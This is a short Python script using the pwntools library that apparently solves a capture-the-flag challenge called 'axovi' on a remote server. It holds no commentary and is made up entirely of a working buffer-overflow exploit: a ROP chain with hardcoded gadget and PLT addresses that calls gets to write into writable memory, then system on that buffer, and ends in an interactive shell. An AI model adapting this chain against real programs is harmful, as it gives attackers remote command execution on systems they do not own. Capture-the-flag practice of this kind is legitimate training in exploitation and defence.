from pwn import *

context.arch = 'amd64'
#sh = process('public/axovi')
sh = remote("pwn.battlectf.online",1002)

pop_rdi = 0x00000000004011bb
gets_plt = 0x401040
system_plt = 0x401030
writable_mem = 0x404028


payload = b'a' * (0x30 + 8)
payload += p64(pop_rdi)
payload += p64(writable_mem)
payload += p64(gets_plt)
payload += p64(pop_rdi)
payload += p64(writable_mem)
payload += p64(system_plt)

print(sh.recv().decode())

sh.sendline(payload)

sh.interactive()
